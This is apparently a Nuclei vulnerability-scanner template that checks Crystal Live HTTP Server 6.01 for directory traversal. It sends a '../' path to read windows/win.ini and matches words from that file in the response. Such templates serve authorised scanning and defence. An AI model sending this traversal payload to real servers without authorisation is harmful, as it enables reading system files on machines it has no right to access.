id: crystal-live-http-server-lfi

info:
  name: Crystal Live HTTP Server 6.01 - Directory Traversal
  author: 0x_Akoko
  severity: high
  reference: https://cxsecurity.com/issue/WLB-2019110127
  tags: crystal,lfi

requests:
  - method: GET
    path:
      - "{{BaseURL}}/../../../../../../../../../../../../windows/win.ini"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "bit app support"
          - "fonts"
          - "extensions"
        part: body
